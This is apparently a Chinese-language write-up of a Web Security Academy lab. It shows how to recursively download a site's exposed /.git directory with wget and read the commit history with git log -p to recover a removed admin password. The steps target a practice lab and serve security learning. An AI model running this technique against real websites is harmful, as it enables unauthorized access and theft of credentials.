Remove admin password from config

安装 git

由于使用git需完整git目录于是使用wget工具下载下载整个目录

下载 wget 并放入 C:\Windows\System32\ 文件夹中
此时 cmd 可使用 wget 命令
而 powershell 需 Remove-Item Alias:wget -Force 移除wget的别名后才可直接使用 wget,否则需使用wget的路径

wget 参数
-r：递归下载所有子目录

使用
wget -r https://0ac7005e03f1a746858e4e2600e0003b.web-security-academy.net/.git
下载整个git目录

进入下载的 git 文件夹
使用 git log -p 命令查看 Git 提交历史的详细信息，包括每个提交的具体代码改动内容。
得到
-ADMIN_PASSWORD=71ybeg2h17a77z0akz4h
